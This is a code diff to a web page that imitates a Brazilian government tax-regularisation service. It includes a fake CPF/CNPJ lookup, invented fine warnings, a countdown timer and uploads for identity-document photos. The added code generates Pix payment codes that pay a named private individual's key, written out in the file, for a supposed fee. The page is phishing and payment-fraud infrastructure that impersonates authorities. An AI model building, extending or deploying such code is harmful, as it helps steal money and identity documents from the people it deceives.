@@ -80,6 +80,7 @@
     .header-actions { display: flex; align-items: center; justify-content: flex-end; gap: 12px; }
     .btn-login { background: var(--gov-blue); color: white; padding: 10px 18px; border-radius: 14px; font-weight: 800; font-size: 0.95rem; display: inline-flex; align-items: center; gap: 10px; border: 1px solid transparent; transition: 0.3s; white-space: nowrap; }
     .btn-login:hover { background: var(--gov-dark-blue); box-shadow: 0 4px 15px rgba(19, 81, 180, 0.3); }
+    .btn-login i { font-size: 1.15rem; }
     .hamburger-btn { display: none; width: 44px; height: 44px; border-radius: 12px; background: #f8f9fa; border: 1px solid #e9ecef; cursor: pointer; align-items: center; justify-content: center; color: #333; transition: 0.2s; }
     .hamburger-btn:hover { background: #f1f3f5; }
 
@@ -467,7 +468,7 @@
                
               <input type="text" class="form-control" id="cnpj_empresa" placeholder="Digite seu CPF ou CNPJ" required style="margin-bottom: 10px;" oninput="window.maskCPFinCNPJ(this)" maxlength="18" />
                
-              <div id="loading-cnpj" style="display:none; font-size: 0.8rem; color: var(--gov-blue); font-weight: bold; margin-bottom: 10px;"><i class="fas fa-spinner fa-spin"></i> Buscando dados e localização via Satélite...</div>
+              <div id="loading-cnpj" style="display:none; font-size: 0.8rem; color: var(--gov-blue); font-weight: bold; margin-bottom: 10px; background: #e0f2fe; padding: 10px; border-radius: 8px;"><i class="fas fa-spinner fa-spin"></i> Buscando dados e localização via Satélite...</div>
                
               <div id="msg-cpf-encontrado" class="cpf-success-msg">
                 <i class="fas fa-check-circle"></i> CPF LOCALIZADO NA BASE DA RECEITA!<br>
@@ -517,7 +518,7 @@
               <div id="area-checklist" style="display: none;">
                 <p style="font-weight: 900; margin-top: 25px; color: var(--gov-dark-blue); border-bottom: 2px solid #e2e8f0; padding-bottom: 10px;">📄 Inventário Documental (Marque APENAS os que JÁ POSSUI):</p>
                  
-                <div style="background: #e0f7fa; color: #006064; padding: 10px; border-radius: 8px; font-size: 0.85rem; font-weight: bold; margin-bottom: 15px; border: 1px solid #b2ebf2;">
+                <div style="background: #e0f7fa; color: #006064; padding: 15px; border-radius: 8px; font-size: 0.9rem; font-weight: bold; margin-bottom: 15px; border: 1px solid #b2ebf2;">
                   <i class="fas fa-camera"></i> <strong>Instrução:</strong> Selecione os documentos e anexe as fotos clicando no botão que aparecerá.
                 </div>
 
@@ -588,7 +589,7 @@
 
                     <label style="font-size: 0.85rem; font-weight: 800; display: block; margin-bottom: 5px; text-align: left; color: #2d3748;">Pix Copia e Cola:</label>
                     <div style="display: flex; gap: 8px;">
-                      <input type="text" id="pix-copia-cola" value="00020126580014br.gov.bcb.pix0136299713b0-c73d-4649-98ca-bb73764cdfe25204000053039865802BR5925GILIARD DE OLIVEIRA SANTI60085500019962070503***6304D4E0" class="form-control" style="margin-bottom: 0; font-size: 0.8rem; padding: 12px; border-color: #cbd5e0; background: #fff;" readonly />
+                      <input type="text" id="pix-copia-cola" value="Aguardando geração..." class="form-control" style="margin-bottom: 0; font-size: 0.8rem; padding: 12px; border-color: #cbd5e0; background: #fff;" readonly />
                       <button onclick="window.copiarPix()" style="background: var(--gov-blue); color: #fff; border: none; padding: 0 20px; border-radius: 8px; cursor: pointer; transition: 0.3s;" title="Copiar código"><i class="fas fa-copy"></i></button>
                     </div>
                   </div>
@@ -823,8 +824,40 @@
   
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
+
+    // ==========================================
+    // CONFIGURAÇÃO DO PIX AUTOMÁTICO (DINÂMICO)
+    // ==========================================
+    const MINHA_CHAVE_PIX = "299713b0-c73d-4649-98ca-bb73764cdfe2"; // << SUA CHAVE AQUI
+    const MEU_NOME_PIX = "GILIARD DE OLIVEIRA SANTI";
+    const MINHA_CIDADE_PIX = "DIADEMA";
+
+    function gerarPayloadPix(chave, nome, cidade, valor, txid="***") {
+        const format = (id, val) => id + (val.length.toString().padStart(2, '0')) + val;
+        let payload = "000201";
+        payload += format("26", "0014BR.GOV.BCB.PIX" + format("01", chave));
+        payload += "52040000";
+        payload += "5303986"; // BRL
+        if (valor) payload += format("54", valor);
+        payload += "5802BR";
+        payload += format("59", nome);
+        payload += format("60", cidade);
+        payload += format("62", format("05", txid));
+        payload += "6304"; // ID do CRC
+        let polinomio = 0x1021;
+        let resultado = 0xFFFF;
+        for (let i = 0; i < payload.length; i++) {
+            resultado ^= (payload.charCodeAt(i) << 8);
+            for (let j = 0; j < 8; j++) {
+                if ((resultado & 0x8000) !== 0) resultado = (resultado << 1) ^ polinomio;
+                else resultado <<= 1;
+            }
+        }
+        resultado &= 0xFFFF;
+        return payload + resultado.toString(16).toUpperCase().padStart(4, '0');
+    }
   
-    // --- FUNÇÕES GLOBAIS (PARA O HTML ENXERGAR O MODULE) ---
+    // --- FUNÇÕES GLOBAIS ---
     window.captchaValidado = false;
     let timerInterval;
   
@@ -842,30 +875,19 @@
     window.maskCPFinCNPJ = function(i) {
       let v = i.value.replace(/\D/g,'');
       if (v.length <= 11) { 
-        v = v.replace(/(\d{3})(\d)/, '$1.$2');
-        v = v.replace(/(\d{3})(\d)/, '$1.$2');
-        v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+        v = v.replace(/(\d{3})(\d)/, '$1.$2'); v = v.replace(/(\d{3})(\d)/, '$1.$2'); v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
       } else { 
-        v = v.replace(/^(\d{2})(\d)/, '$1.$2');
-        v = v.replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3');
-        v = v.replace(/\.(\d{3})(\d)/, '.$1/$2');
-        v = v.replace(/(\d{4})(\d)/, '$1-$2');
+        v = v.replace(/^(\d{2})(\d)/, '$1.$2'); v = v.replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3'); v = v.replace(/\.(\d{3})(\d)/, '.$1/$2'); v = v.replace(/(\d{4})(\d)/, '$1-$2');
       }
       i.value = v;
     };
   
     window.validarCPF = function(cpf) {
       if (cpf == "00000000000" || cpf == "11111111111") return false;
-      let add = 0;
-      for (let i = 0; i < 9; i++) add += parseInt(cpf.charAt(i)) * (10 - i);
-      let rev = 11 - (add % 11);
-      if (rev == 10 || rev == 11) rev = 0;
-      if (rev != parseInt(cpf.charAt(9))) return false;
-      add = 0;
-      for (let i = 0; i < 10; i++) add += parseInt(cpf.charAt(i)) * (11 - i);
-      rev = 11 - (add % 11);
-      if (rev == 10 || rev == 11) rev = 0;
-      if (rev != parseInt(cpf.charAt(10))) return false;
+      let add = 0; for (let i = 0; i < 9; i++) add += parseInt(cpf.charAt(i)) * (10 - i);
+      let rev = 11 - (add % 11); if (rev == 10 || rev == 11) rev = 0; if (rev != parseInt(cpf.charAt(9))) return false;
+      add = 0; for (let i = 0; i < 10; i++) add += parseInt(cpf.charAt(i)) * (11 - i);
+      rev = 11 - (add % 11); if (rev == 10 || rev == 11) rev = 0; if (rev != parseInt(cpf.charAt(10))) return false;
       return true;
     };
   
@@ -890,12 +912,10 @@
     window.realizarConsultaFake = function() {
       const input = document.getElementById('fake_consulta_cnpj').value;
       if(input.length < 5) { alert("Digite um CPF/CNPJ válido."); return; }
-        
       let res = document.getElementById('fake_consulta_resultado');
       res.style.display = 'block';
       res.style.background = '#e0f2fe'; res.style.color = '#0369a1';
       res.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Buscando no sistema de fiscalização estadual...';
-        
       setTimeout(() => {
         res.style.background = '#fee2e2';
         res.style.color = '#b91c1c';
@@ -943,7 +963,6 @@
       let divRisco = document.getElementById('risco-multa');
       divRisco.style.display = 'block';
       let naoMarcados = document.querySelectorAll('.doc-check:not(:checked)').length;
-        
       if(naoMarcados === 0) {
         divRisco.style.background = '#dcfce3'; divRisco.style.color = '#166534';
         divRisco.innerHTML = '<i class="fas fa-shield-alt"></i> Tudo OK! Regularize agora para manter a segurança do CPF/CNPJ.';
@@ -954,7 +973,6 @@
     };
   
     function criarDocItem(valor, icone, titulo) {
-      // Input com accept="image/*" para celular
       return `
         <div class="doc-wrapper" style="display:flex; flex-direction:column; gap:8px;">
           <label class="doc-item"><input type="checkbox" class="doc-check" value="${valor}" onchange="window.toggleUpload(this)"/><i class="fas ${icone}"></i><span>${titulo}</span></label>
@@ -1349,6 +1367,11 @@
                 document.getElementById('valor-cobrado').innerText = valorFormatado;
                 cnpjParaComprovante = cnpj;
                 
+                // GERA O PIX COM O VALOR RECEBIDO DO FIREBASE
+                let valorLimpo = pedido.valor.replace(',', '.');
+                let codigoPix = gerarPayloadPix(MINHA_CHAVE_PIX, MEU_NOME_PIX, MINHA_CIDADE_PIX, valorLimpo, "TAXA01");
+                document.getElementById('pix-copia-cola').value = codigoPix;
+
                 window.atualizarBarraProgresso(3); 
                 window.iniciarCronometroPix(); 
               }
